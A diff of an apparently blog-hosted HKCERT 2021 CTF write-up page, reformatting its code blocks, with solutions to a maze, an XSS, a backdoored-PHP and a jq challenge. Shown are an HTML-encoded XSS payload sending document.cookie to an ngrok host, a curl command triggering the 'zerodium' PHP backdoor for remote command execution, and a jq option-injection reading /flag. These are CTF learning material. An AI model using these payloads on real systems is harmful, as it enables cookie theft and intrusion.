-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag = &#34;&#34;
+</span></span><span class=line><span class=cl>mystery = &#39;NEWS&#39;
+</span></span><span class=line><span class=cl>dict = {}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>f = open(&#34;path.txt&#34;, &#34;r&#34;)
+</span></span><span class=line><span class=cl>lines = f.read()
+</span></span><span class=line><span class=cl>for line in lines.split(&#39;\n&#39;):
+</span></span><span class=line><span class=cl>    if line:
+</span></span><span class=line><span class=cl>        tmp = line.split(&#39;=&#39;)
+</span></span><span class=line><span class=cl>        if tmp[1] == &#39; _29aa7a86665899ed&#39;:
+</span></span><span class=line><span class=cl>            continue
+</span></span><span class=line><span class=cl>        else:
+</span></span><span class=line><span class=cl>            t = tmp[1].split(&#39;&#34;&#39;)
+</span></span><span class=line><span class=cl>            if &#34;False&#34; in tmp[1]:
+</span></span><span class=line><span class=cl>                dict[tmp[0][:-1]] = [0, t[1], t[3], t[5], t[7]]
+</span></span><span class=line><span class=cl>            else:
+</span></span><span class=line><span class=cl>                dict[tmp[0][:-1]] = [1, t[1], t[3], t[5], t[7]]
+</span></span><span class=line><span class=cl>      
+</span></span><span class=line><span class=cl>for k, v in dict.items():
+</span></span><span class=line><span class=cl>    dict[k] = [0 if (not(x in dict) and not(x)) else x for x in v]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def bfs(start, goal):
+</span></span><span class=line><span class=cl>    visited = []
+</span></span><span class=line><span class=cl>    queue = [[[start, &#39;-1&#39;]]]
+</span></span><span class=line><span class=cl>    while queue:
+</span></span><span class=line><span class=cl>        path = queue.pop(0)
+</span></span><span class=line><span class=cl>        node = path[-1][0]
+</span></span><span class=line><span class=cl>        if node not in visited:
+</span></span><span class=line><span class=cl>            neighbours = dict[node]
+</span></span><span class=line><span class=cl>            for i, neighbour in enumerate(neighbours):
+</span></span><span class=line><span class=cl>                if neighbour != 0 and neighbour in dict:
+</span></span><span class=line><span class=cl>                    new_path = list(path)
+</span></span><span class=line><span class=cl>                    new_path.append([neighbour, mystery[i-1]])
+</span></span><span class=line><span class=cl>                    queue.append(new_path)
+</span></span><span class=line><span class=cl>                    if neighbour == goal:
+</span></span><span class=line><span class=cl>                        return new_path
+</span></span><span class=line><span class=cl>            visited.append(node)
+</span></span><span class=line><span class=cl>    return 0
+</span></span><span class=line><span class=cl>p = bfs(&#39;_328518a497015157&#39;, &#39;_8b0eb6f195ae182a&#39;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>for x in p:
+</span></span><span class=line><span class=cl>    flag = flag + x[1]
+</span></span><span class=line><span class=cl>print(flag[1:])
+</span></span></code></pre></td></tr></table></div></div><p><code>solve.py</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -633,44 +300,27 @@ print(flag[1:])
 </span><span class=lnt>17
 </span><span class=lnt>18
 </span><span class=lnt>19
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>from pwn import *
-import os
-import base64
-import hashlib
-ans = &#34;SSSSEENNE...&lt;snipped&gt;...ENNEESSEEEE&#34;
-
-r = remote(&#34;chalp.hkcert21.pwnable.hk&#34;, 28117)
-r.recvuntil(&#39;🔧&#39;)
-challenge = base64.b64decode(r.recvline()[:-1])
-while True:
-    response = os.urandom(8)
-    h = hashlib.sha256(challenge + response).digest()
-    if h.startswith(b&#39;\x00\x00\x00&#39;):
-        r.recvuntil(&#39;🔩&#39;)
-        r.sendline(base64.b64encode(response))
-        break
-print(r.recvuntil(&#39;🥺 &#39;))
-r.sendline(ans)
-r.interactive()
-</code></pre></td></tr></table>
-</div>
-</div><p>FLAG : <strong>hkcert21{4lw4ys_l0ok_4t_s74ck_0verf1ow_wh3n_y0u_w4nt_t0_4v01d_s7ack_0v3rfl0ws}</strong></p>
-<p>P.S. I sent this meme to the author after solved this challenge :)
-<img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png data-srcset="https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png, https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png 1.5x, https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png title=haha></p>
-<h2 id=純孩兒-babyxss---web-100-points>純孩兒 (babyXSS) - Web (100 points)</h2>
-<h3 id=challenge--4>Challenge :</h3>
-<blockquote>
-<p>Have you tried the infant xss challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE&mldr;<br>
-<a href=http://babyxss-m7neh9.hkcert21.pwnable.hk target=_blank rel="noopener noreffer">http://babyxss-m7neh9.hkcert21.pwnable.hk</a><br>
-XSS Bot: <a href=http://xssbot-cxild5.hkcert21.pwnable.hk target=_blank rel="noopener noreffer">http://xssbot-cxild5.hkcert21.pwnable.hk</a></p>
-</blockquote>
-<h3 id=solution--4>Solution :</h3>
-<p>Checking the source code of the webpage, we can obtain some obfuscated javascript.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import *
+</span></span><span class=line><span class=cl>import os
+</span></span><span class=line><span class=cl>import base64
+</span></span><span class=line><span class=cl>import hashlib
+</span></span><span class=line><span class=cl>ans = &#34;SSSSEENNE...&lt;snipped&gt;...ENNEESSEEEE&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r = remote(&#34;chalp.hkcert21.pwnable.hk&#34;, 28117)
+</span></span><span class=line><span class=cl>r.recvuntil(&#39;🔧&#39;)
+</span></span><span class=line><span class=cl>challenge = base64.b64decode(r.recvline()[:-1])
+</span></span><span class=line><span class=cl>while True:
+</span></span><span class=line><span class=cl>    response = os.urandom(8)
+</span></span><span class=line><span class=cl>    h = hashlib.sha256(challenge + response).digest()
+</span></span><span class=line><span class=cl>    if h.startswith(b&#39;\x00\x00\x00&#39;):
+</span></span><span class=line><span class=cl>        r.recvuntil(&#39;🔩&#39;)
+</span></span><span class=line><span class=cl>        r.sendline(base64.b64encode(response))
+</span></span><span class=line><span class=cl>        break
+</span></span><span class=line><span class=cl>print(r.recvuntil(&#39;🥺 &#39;))
+</span></span><span class=line><span class=cl>r.sendline(ans)
+</span></span><span class=line><span class=cl>r.interactive()
+</span></span></code></pre></td></tr></table></div></div><p>FLAG : <strong>hkcert21{4lw4ys_l0ok_4t_s74ck_0verf1ow_wh3n_y0u_w4nt_t0_4v01d_s7ack_0v3rfl0ws}</strong></p><p>P.S. I sent this meme to the author after solved this challenge :)
+<img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png data-srcset="https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png, https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png 1.5x, https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png title=haha></p><h2 id=純孩兒-babyxss---web-100-points>純孩兒 (babyXSS) - Web (100 points)</h2><h3 id=challenge--4>Challenge :</h3><blockquote><p>Have you tried the infant xss challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE&mldr;<br><a href=http://babyxss-m7neh9.hkcert21.pwnable.hk target=_blank rel="noopener noreffer">http://babyxss-m7neh9.hkcert21.pwnable.hk</a><br>XSS Bot: <a href=http://xssbot-cxild5.hkcert21.pwnable.hk target=_blank rel="noopener noreffer">http://xssbot-cxild5.hkcert21.pwnable.hk</a></p></blockquote><h3 id=solution--4>Solution :</h3><p>Checking the source code of the webpage, we can obtain some obfuscated javascript.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -685,29 +335,22 @@ XSS Bot: <a href=http://xssbot-cxild5.hkcert21.pwnable.hk target=_blank rel="noo
 </span><span class=lnt>13
 </span><span class=lnt>14
 </span><span class=lnt>15
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>TOUPPERCASE = &#34;\164\157\125\160\160\145\162\103\141\163\145&#34;;
-SUBSTR = &#34;\163\165\142\163\164\162&#34;;
-ENCODEURI = &#34;\145\156\143\157\144\145\125\122\111&#34;;
-DECODEURI = &#34;\144\145\143\157\144\145\125\122\111&#34;;
-VALUE = &#34;\166\141\154\165\145&#34;;
-SRCDOC = &#34;\163\162\143\144\157\143&#34;;
-CONTENTWINDOW = &#34;\143\157\156\164\145\156\164\127\151\156\144\157\167&#34;;
-PARENT = &#34;\160\141\162\145\156\164&#34;;
-LOCATION = &#34;\154\157\143\141\164\151\157\156&#34;;
-HASH = &#34;\150\141\163\150&#34;;
-WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
-
-CONVERT = () =&gt; {
-    INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](1));
-    OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
-</code></pre></td></tr></table>
-</div>
-</div><p>Tried to deobfuscate the code using <a href=https://deobfuscate.io/ target=_blank rel="noopener noreffer">https://deobfuscate.io/</a>, we can get:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>TOUPPERCASE = &#34;\164\157\125\160\160\145\162\103\141\163\145&#34;;
+</span></span><span class=line><span class=cl>SUBSTR = &#34;\163\165\142\163\164\162&#34;;
+</span></span><span class=line><span class=cl>ENCODEURI = &#34;\145\156\143\157\144\145\125\122\111&#34;;
+</span></span><span class=line><span class=cl>DECODEURI = &#34;\144\145\143\157\144\145\125\122\111&#34;;
+</span></span><span class=line><span class=cl>VALUE = &#34;\166\141\154\165\145&#34;;
+</span></span><span class=line><span class=cl>SRCDOC = &#34;\163\162\143\144\157\143&#34;;
+</span></span><span class=line><span class=cl>CONTENTWINDOW = &#34;\143\157\156\164\145\156\164\127\151\156\144\157\167&#34;;
+</span></span><span class=line><span class=cl>PARENT = &#34;\160\141\162\145\156\164&#34;;
+</span></span><span class=line><span class=cl>LOCATION = &#34;\154\157\143\141\164\151\157\156&#34;;
+</span></span><span class=line><span class=cl>HASH = &#34;\150\141\163\150&#34;;
+</span></span><span class=line><span class=cl>WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>CONVERT = () =&gt; {
+</span></span><span class=line><span class=cl>    INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](1));
+</span></span><span class=line><span class=cl>    OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
+</span></span></code></pre></td></tr></table></div></div><p>Tried to deobfuscate the code using <a href=https://deobfuscate.io/ target=_blank rel="noopener noreffer">https://deobfuscate.io/</a>, we can get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -718,79 +361,27 @@ CONVERT = () =&gt; {
 </span><span class=lnt> 9
 </span><span class=lnt>10
 </span><span class=lnt>11
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>TOUPPERCASE = &#34;toUpperCase&#34;;
-SUBSTR = &#34;substr&#34;;
-ENCODEURI = &#34;encodeURI&#34;;
-DECODEURI = &#34;decodeURI&#34;;
-VALUE = &#34;value&#34;;
-SRCDOC = &#34;srcdoc&#34;;
-CONTENTWINDOW = &#34;contentWindow&#34;;
-PARENT = &#34;parent&#34;;
-LOCATION = &#34;location&#34;;
-HASH = &#34;hash&#34;;
-WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
-</code></pre></td></tr></table>
-</div>
-</div><p>Next let&rsquo;s rewrite the <code>CONVERT</code> function:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>TOUPPERCASE = &#34;toUpperCase&#34;;
+</span></span><span class=line><span class=cl>SUBSTR = &#34;substr&#34;;
+</span></span><span class=line><span class=cl>ENCODEURI = &#34;encodeURI&#34;;
+</span></span><span class=line><span class=cl>DECODEURI = &#34;decodeURI&#34;;
+</span></span><span class=line><span class=cl>VALUE = &#34;value&#34;;
+</span></span><span class=line><span class=cl>SRCDOC = &#34;srcdoc&#34;;
+</span></span><span class=line><span class=cl>CONTENTWINDOW = &#34;contentWindow&#34;;
+</span></span><span class=line><span class=cl>PARENT = &#34;parent&#34;;
+</span></span><span class=line><span class=cl>LOCATION = &#34;location&#34;;
+</span></span><span class=line><span class=cl>HASH = &#34;hash&#34;;
+</span></span><span class=line><span class=cl>WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+</span></span></code></pre></td></tr></table></div></div><p>Next let&rsquo;s rewrite the <code>CONVERT</code> function:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>CONVERT = () =&gt; {
-    INPUT[VALUE] = decodeURI(location.hash.substr(1));
-    OUTPUT[SRCDOC] = INPUT.value.toUpperCase();
-</code></pre></td></tr></table>
-</div>
-</div><p>From the <code>CONVERT</code> function, we know that it will take the input from the URL after <code>#</code> and convert to uppercase, i.e. for <code>http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cscript%3Ealert('XSS')%3C/script%3E</code>, it will be converted to <code>&lt;SCRIPT>ALERT('XSS')&lt;/SCRIPT></code> which is not a valid javascript as shown below:<br>
-<img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png data-srcset="https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png, https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png 1.5x, https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png title=babyxss></p>
-<p>Therefore we need to find some function that is also defined in uppercase.
-We can use html encoding to bypass the <code>toUpperCase</code>.</p>
-<p><strong>Solve:</strong></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cimg%20src=x%20onerror=%22&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x2E;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x33;&amp;#x61;&amp;#x63;&amp;#x63;&amp;#x2D;&amp;#x31;&amp;#x38;&amp;#x33;&amp;#x2D;&amp;#x31;&amp;#x37;&amp;#x39;&amp;#x2D;&amp;#x37;&amp;#x32;&amp;#x2D;&amp;#x32;&amp;#x33;&amp;#x30;&amp;#x2E;&amp;#x6E;&amp;#x67;&amp;#x72;&amp;#x6F;&amp;#x6B;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2F;&amp;#x3F;&amp;#x66;&amp;#x6C;&amp;#x61;&amp;#x67;&amp;#x3D;&amp;#x27;&amp;#x2B;&amp;#x65;&amp;#x6E;&amp;#x63;&amp;#x6F;&amp;#x64;&amp;#x65;&amp;#x55;&amp;#x52;&amp;#x49;&amp;#x43;&amp;#x6F;&amp;#x6D;&amp;#x70;&amp;#x6F;&amp;#x6E;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6F;&amp;#x6B;&amp;#x69;&amp;#x65;&amp;#x29;%22%3E%3C/img%3E
-</code></pre></td></tr></table>
-</div>
-</div><p>FLAG : <strong>hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}</strong></p>
-<h2 id=荊棘海-the-wilderness---web-100-points>荊棘海 (The Wilderness) - Web (100 points)</h2>
-<h3 id=challenge--5>Challenge :</h3>
-<blockquote>
-<blockquote>
-<p>就在回望一刻總有哀 世界已不再 誰偏偏一再 等待 到終於不記得等待</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox&mldr; What can go wrong?<br>
-<a href=http://chalp.hkcert21.pwnable.hk:28364/ target=_blank rel="noopener noreffer">http://chalp.hkcert21.pwnable.hk:28364/</a></p>
-</blockquote>
-<h3 id=files--4>Files :</h3>
-<p><a href=/files/HKCERT/sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip rel>sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip</a></p>
-<h3 id=solution--5>Solution :</h3>
-<p>From the <code>index.php</code> we know that the flag is in the comment block of the source code, but there is no other useful stuff inside&mldr;so let&rsquo;s have a look at the Docker file.<br>
-From the <code>Dockerfile</code>, it is weird that the PHP is installed by downloading a specific version of PHP from Github (<code>wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip</code>). By Googling the hash we can find that it is the affected version of the hacked PHP, which the PHP Git server was hacked and a RCE backdoor was injected into the source code. Therefore we can exploit the RCE to get the content of the <code>index.php</code>, i.e. the flag by adding the HTTP header <code>User-Agentt</code> with the command prepending the magic word <code>zerodium</code>.</p>
-<p><strong>Solve:</strong><br>
-<code>curl http://chalp.hkcert21.pwnable.hk:28364/ -H "User-Agentt: zerodiumsystem('cat index.php');"</code></p>
-<p>FLAG : <strong>hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n}</strong></p>
-<h2 id=樂園-jq-playground---web-200-points>樂園 (JQ Playground) - Web (200 points)</h2>
-<h3 id=challenge--6>Challenge :</h3>
-<blockquote>
-<p>I wrote a simple testbed for the JSON processor jq!<br>
-The flag is written in the file /flag.<br>
-<a href=http://chalp.hkcert21.pwnable.hk:28370/ target=_blank rel="noopener noreffer">http://chalp.hkcert21.pwnable.hk:28370/</a></p>
-</blockquote>
-<h3 id=solution--6>Solution :</h3>
-<p>At the bottom of the webpage, we can see the button <a href=http://chalp.hkcert21.pwnable.hk:28370/?-s target=_blank rel="noopener noreffer"><code>View Source</code></a> and get the key source code:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CONVERT = () =&gt; {
+</span></span><span class=line><span class=cl>    INPUT[VALUE] = decodeURI(location.hash.substr(1));
+</span></span><span class=line><span class=cl>    OUTPUT[SRCDOC] = INPUT.value.toUpperCase();
+</span></span></code></pre></td></tr></table></div></div><p>From the <code>CONVERT</code> function, we know that it will take the input from the URL after <code>#</code> and convert to uppercase, i.e. for <code>http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cscript%3Ealert('XSS')%3C/script%3E</code>, it will be converted to <code>&lt;SCRIPT>ALERT('XSS')&lt;/SCRIPT></code> which is not a valid javascript as shown below:<br><img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png data-srcset="https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png, https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png 1.5x, https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/143604225-ae70f52b-bb64-44a6-99a9-75e70fe7bf54.png title=babyxss></p><p>Therefore we need to find some function that is also defined in uppercase.
+We can use html encoding to bypass the <code>toUpperCase</code>.</p><p><strong>Solve:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cimg%20src=x%20onerror=%22&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x2E;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x33;&amp;#x61;&amp;#x63;&amp;#x63;&amp;#x2D;&amp;#x31;&amp;#x38;&amp;#x33;&amp;#x2D;&amp;#x31;&amp;#x37;&amp;#x39;&amp;#x2D;&amp;#x37;&amp;#x32;&amp;#x2D;&amp;#x32;&amp;#x33;&amp;#x30;&amp;#x2E;&amp;#x6E;&amp;#x67;&amp;#x72;&amp;#x6F;&amp;#x6B;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2F;&amp;#x3F;&amp;#x66;&amp;#x6C;&amp;#x61;&amp;#x67;&amp;#x3D;&amp;#x27;&amp;#x2B;&amp;#x65;&amp;#x6E;&amp;#x63;&amp;#x6F;&amp;#x64;&amp;#x65;&amp;#x55;&amp;#x52;&amp;#x49;&amp;#x43;&amp;#x6F;&amp;#x6D;&amp;#x70;&amp;#x6F;&amp;#x6E;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6F;&amp;#x6B;&amp;#x69;&amp;#x65;&amp;#x29;%22%3E%3C/img%3E
+</span></span></code></pre></td></tr></table></div></div><p>FLAG : <strong>hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}</strong></p><h2 id=荊棘海-the-wilderness---web-100-points>荊棘海 (The Wilderness) - Web (100 points)</h2><h3 id=challenge--5>Challenge :</h3><blockquote><blockquote><p>就在回望一刻總有哀 世界已不再 誰偏偏一再 等待 到終於不記得等待</p></blockquote></blockquote><blockquote><p>Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox&mldr; What can go wrong?<br><a href=http://chalp.hkcert21.pwnable.hk:28364/ target=_blank rel="noopener noreffer">http://chalp.hkcert21.pwnable.hk:28364/</a></p></blockquote><h3 id=files--4>Files :</h3><p><a href=/files/HKCERT/sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip rel>sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip</a></p><h3 id=solution--5>Solution :</h3><p>From the <code>index.php</code> we know that the flag is in the comment block of the source code, but there is no other useful stuff inside&mldr;so let&rsquo;s have a look at the Docker file.<br>From the <code>Dockerfile</code>, it is weird that the PHP is installed by downloading a specific version of PHP from Github (<code>wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip</code>). By Googling the hash we can find that it is the affected version of the hacked PHP, which the PHP Git server was hacked and a RCE backdoor was injected into the source code. Therefore we can exploit the RCE to get the content of the <code>index.php</code>, i.e. the flag by adding the HTTP header <code>User-Agentt</code> with the command prepending the magic word <code>zerodium</code>.</p><p><strong>Solve:</strong><br><code>curl http://chalp.hkcert21.pwnable.hk:28364/ -H "User-Agentt: zerodiumsystem('cat index.php');"</code></p><p>FLAG : <strong>hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n}</strong></p><h2 id=樂園-jq-playground---web-200-points>樂園 (JQ Playground) - Web (200 points)</h2><h3 id=challenge--6>Challenge :</h3><blockquote><p>I wrote a simple testbed for the JSON processor jq!<br>The flag is written in the file /flag.<br><a href=http://chalp.hkcert21.pwnable.hk:28370/ target=_blank rel="noopener noreffer">http://chalp.hkcert21.pwnable.hk:28370/</a></p></blockquote><h3 id=solution--6>Solution :</h3><p>At the bottom of the webpage, we can see the button <a href=http://chalp.hkcert21.pwnable.hk:28370/?-s target=_blank rel="noopener noreffer"><code>View Source</code></a> and get the key source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -816,105 +407,46 @@ The flag is written in the file /flag.<br>
 </span><span class=lnt>24
 </span><span class=lnt>25
 </span><span class=lnt>26
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>&lt;?php
-if (isset($_GET[&#34;-s&#34;])) {
-    highlight_file(__FILE__);
-    exit();
-}
-if (!empty($_POST)) {
-  if (empty($_POST[&#39;filter&#39;]) || empty($_POST[&#39;json&#39;])) {
-    die(&#34;Filter or JSON is empty&#34;);
-  }
-
-  $filter = escapeshellarg($_POST[&#39;filter&#39;]);
-  $json = escapeshellarg($_POST[&#39;json&#39;]);
-  
-  $options = &#34;&#34;;
-
-  if (!empty($_POST[&#39;options&#39;]) &amp;&amp; is_array($_POST[&#39;options&#39;])) {
-    foreach ($_POST[&#39;options&#39;] as $o) {
-      $options .= escapeshellarg($o) . &#39; &#39;;
-    }
-  }
-
-  $command = &#34;jq $options $filter&#34;;
-  passthru(&#34;echo $json | $command&#34;);
-
-  die();
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>We can see that we are providing parameters and input to call the <code>jq</code> and our goal is to get the file <code>/flag</code>. With some <a href=https://www.jianshu.com/p/e05a5940f833 target=_blank rel="noopener noreffer">Googling</a> I found that we can use <code>--rawfile</code> to get the file content. With some trials to crafting the payload, we can get the flag by reflecting the content out with the command <code>echo {"data":{"update":null}}' | jq --rawfile a /flag '.data.update = $a'</code>.</p>
-<p><strong>Solve:</strong><br>
-<code>curl -X POST 'http://chalp.hkcert21.pwnable.hk:28370/' -F 'filter=.data.update=$a' -F 'json={"data":{"update":null}}' -F 'options[]=--rawfile' -F 'options[]=a' -F 'options[]=/flag'</code></p>
-<p>FLAG : <strong>hkcert21{y0u\are\n0w\jq\expert!}</strong></p>
-<h2 id=回到12歲-scratch-tic-tac-toe---misc-200-points>回到12歲 (scratch-tic-tac-toe) - Misc (200 points)</h2>
-<h3 id=challenge--7>Challenge :</h3>
-<blockquote>
-<p>If you can beat me in the game I&rsquo;ll give you the flag!<br>
-<a href=https://scratch.mit.edu/projects/596813541/ target=_blank rel="noopener noreffer">https://scratch.mit.edu/projects/596813541/</a></p>
-</blockquote>
-<h3 id=solution--7>Solution :</h3>
-<p>This is a Tic-Tac-Toe game written in Scratch. It did bring me back to my F.4 life which I learnt about Scratch in my ICT lesson.<br>
-We can click the <code>See inside</code> button to view the source code of this project. By selecting the <code>Title</code>, we can see a yellow notes and if you remove it, you can see the key logic of getting the flag.
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>if (isset($_GET[&#34;-s&#34;])) {
+</span></span><span class=line><span class=cl>    highlight_file(__FILE__);
+</span></span><span class=line><span class=cl>    exit();
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>if (!empty($_POST)) {
+</span></span><span class=line><span class=cl>  if (empty($_POST[&#39;filter&#39;]) || empty($_POST[&#39;json&#39;])) {
+</span></span><span class=line><span class=cl>    die(&#34;Filter or JSON is empty&#34;);
